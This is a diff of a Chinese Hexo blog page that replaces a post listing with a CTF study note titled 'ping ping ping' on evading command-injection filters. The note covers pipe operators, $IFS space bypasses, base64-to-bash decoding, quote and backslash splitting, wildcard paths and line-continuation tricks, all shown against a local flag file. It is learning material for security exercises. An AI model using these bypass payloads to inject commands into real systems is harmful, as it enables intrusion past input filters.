@@ -5,10 +5,6 @@
   <!-- SEO相关 -->
   
     
-      
-        <meta name="robots" content="noindex,follow">
-      
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -23,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Hexo</title>
+  <title>ping ping ping - Hexo</title>
   
 
   
@@ -309,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  dock' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -385,468 +381,318 @@
         
 
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-  <section class="post-list">
+
+
+  
+  <div class="article-meta" id="top">
     
     
+    
+      <h1 class="title">
+        ping ping ping
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Mar 7, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/">
-        复习一波
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#做了这么多道题，也来复习一下吧。</p>
-    
+      <div id="lc-pv" data-title="ping ping ping" data-path="/2021/03/07/ping/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-19</time>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <a id="more"></a>
+
+<p>感觉这道题做了2次，还是对某些命令不了解</p>
+<p>下面就找了一位师傅的文章，系统的学习一下</p>
+<h2>常见的管道符</h2>
+
+<h3>windows</h3>
+
+<li>|:直接执行后面的语句（必须保证前面是真）
+
+<li>||:如果前面是错的，就直接执行后面的语句，否则就前面
+
+<li>&：无论真假都执行
+<li>&&：如果前面是假，则两条都不执行，如果是真则执行两条
+<h3>linux</h3>
+
+<p>多了一个；，跟&amp;一样</p>
+<h2>空格过滤</h2>
+
+<li>$IFS$9
+<li>${IFS}
+<LI>%09(需要php环境)
+<li>重定向符<>,<(这个尝试后好像不行，但是师傅做的可以（root@kali:~# cat<>flag
+
+<p>this is your flag )(有常识了一下，cat&lt;flag可以，但是cat&lt;flag.htm不行，现在试试cat f.php,cat flag是可以的，晚上回来了在研究研究)</p>
+<h2>黑名单绕过</h2>
+<h3>拼接</h3>
+a=c;b=at;c=fl;d=ag;$a$b $c$d
+<h3>base64编码</h3>
+\`echo Y2F0IGZsYWc=|base64 -d\`
+
+<p>echo Y2F0IGZsYWc=|base64 -d|bash</p>
+<p>echo Y2F0IGZsYWc=|base64 -d|sh</p>
+<h3>单引号和双引号</h3>
+
+<p>c””at fl’’ag</p>
+<h3>反斜线</h3>
+
+<p>c\at fl\ag</p>
+<h3>$1,$2等和$@</h3>
+
+<p>c$1at f$@lag</p>
+<h3>读文件绕过</h3>
+
+<p>(1)more:一页一页的显示档案内容</p>
+<p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p>
+<p>(3)head:查看头几行</p>
+<p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
+<p>(5)tail:查看尾几行</p>
+<p>(6)nl：显示的时候，顺便输出行号</p>
+<p>(7)od:以二进制的方式读取档案内容</p>
+<p>(8)vi:一种编辑器，这个也可以查看</p>
+<p>(9)vim:一种编辑器，这个也可以查看</p>
+<p>(10)sort:可以查看</p>
+<p>(11)uniq:可以查看</p>
+<p>(12)file -f:报错出具体内容</p>
+<h3>通配符绕过</h3>
+
+<p>root@kali:~# /???/?[a][t] ?’’?’’?’’?’’</p>
+<p>this is your flag</p>
+<p>xx</p>
+<p>cc</p>
+<p>xa</p>
+<p>/bin/cat: test: 是一个目录</p>
+<p>root@kali:~# /???/?at flag</p>
+<p>this is your flag</p>
+<p>xx</p>
+<p>cc</p>
+<p>xa</p>
+<p>root@kali:~# /???/?at ????</p>
+<p>this is your flag</p>
+<p>xx</p>
+<p>cc</p>
+<p>xa</p>
+<p>/bin/cat: test: 是一个目录</p>
+<p>root@kali:~# /???/?[a]’’[t] ?’’?’’?’’?’’</p>
+<p>this is your flag</p>
+<p>xx</p>
+<p>cc</p>
+<p>xa</p>
+<p>/bin/cat: test: 是一个目录</p>
+<h3>内敛执行绕过</h3>
+\`命令\`和$(命令)都是执行方式
+
+<p>echo “xx`pwd`“</p>
+<p>echo “xx$(pwd)”</p>
+<h3>绕过长度限制</h3>
+
+<p>见原博客</p>
+<h3>linux中命令换行</h3>
+在linux，但我们执行文件的时候，我们通过在没有写完的命令后面加\，可以将一条命令写多行
+root@kali:~# ca\
+
+<p>t\</p>
+<p>fl\</p>
+<p>ag</p>
+<p>this is your flag</p>
+<p>既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下</p>
+<p>root@kali:~# echo “ca\“&gt;cmd</p>
+<p>root@kali:~# echo “t\“&gt;&gt;cmd</p>
+<p>root@kali:~# echo “ fl\“&gt;&gt;cmd</p>
+<p>root@kali:~# echo “ag”&gt;&gt;cmd</p>
+<p>root@kali:~# cat cmd</p>
+<p>ca\</p>
+<p>t\</p>
+<p> fl\</p>
+<p>ag</p>
+<p>root@kali:~# sh cmd</p>
+<p>this is your flag</p>
+<p>用这种方法可以绕过一些长度限制读取文件内容</p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2021/01/19/%E5%A4%8D%E4%B9%A0%E4%B8%80%E6%B3%A2/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/03/07/ping/>http://ckylsy.github.io/2021/03/07/ping/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-07T12:32:53+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Mar 7, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/">
-        postbuu网鼎杯areunserialize
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
+          
+
+        
       
         
-
-    &lt;?php
-
-include(&quot;flag.php&quot;);
-
- highlight_file(__FILE__);
-
-class FileHandler &#123;
-
-protected $op;
-protected $filename;
-protected $content;//类型为protected
-
-function __construct() &...
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/03/07/ping/&title=ping ping ping - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/03/07/ping/&title=ping ping ping - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/03/07/ping/&title=ping ping ping - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-18</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/01/18/postbuu%E7%BD%91%E9%BC%8E%E6%9D%AFareunserialize/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/">
-        反序列学习&buu刷题的第二天,CTFshow部分题目
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>以此用来记录学习反序列化的时候遇见的题目</p>
-    
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-17</time>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2021/01/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%A6%E4%B9%A0/'>
-            Read More
-          </a>
-        </div>
+      
+        <a class='next' href='/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/'>
+          <p class='title'>ssrf(简单的做一下)<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+
+这里面的几个函数，上个题目做的时候已经介绍过，整段代码就是输入url把这个界面的内容输出
+我们输入url=127.0.0.1,会发现它又把整端代码从新返回了一下
+所以我们尝试输入127.0...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/">
-        buu学习第二天（两题）
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>buu的第二天的学习。</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-16</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/01/16/buu%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/01/15/up/">
-        buu warm up
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>开启buu刷题之路</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-01-15</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/01/15/up/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-        sql注入学习
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>忘保存了，写了一半全没了。。。。。。。那就随便写写，本来写这个就是为了可以更好的理解sql注入，现在一半都没了，也就随便吧，无所谓了</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-28</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/27/web4-web5-web6/">
-        web4,web5,web6，耗子尾汁
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>web4-6，耗子尾汁</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-27</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/27/web4-web5-web6/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/">
-        php学习之路基础篇
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>从php开始学起</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-23</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/23/php%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%AF%87/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/">
-        c++实验
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>把计算机导论实验布置的实验总结一下</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-20</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/20/postc-%E5%AE%9E%E9%AA%8C/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-        信息收集
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        
-
-目录遍历
-路径遍历攻击(目录遍历)旨在访问存储在web根目录文件夹之外的文件和目录。通过操控带有“点-斜线（...）”序列以及变化的文件或使用绝对文件路径来引用文件变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码，配置文件和关键系统文件。需要注意的是，系统访问控制(如在微软windows操作系统上锁定或使用文件)限制了对文件的访问权限。这种攻击也称为“点点斜杠”，“目录...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-08</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/page/5/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          6 / 8
-        </p>
-        
-          <a class="next" rel="next" href="/page/7/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -856,82 +702,22 @@ function __construct() &...
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
+  <header>
     
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
 
-  
 
-  
-    
-    
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">常见的管道符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">单引号和双引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">反斜线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">$1,$2等和$@</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">读文件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">内敛执行绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">绕过长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">linux中命令换行</span></a></li></ol></li></ol>
+    </div>
+  </section>
 
-  
 
   
 
@@ -947,8 +733,8 @@ function __construct() &...
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="ping ping ping";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
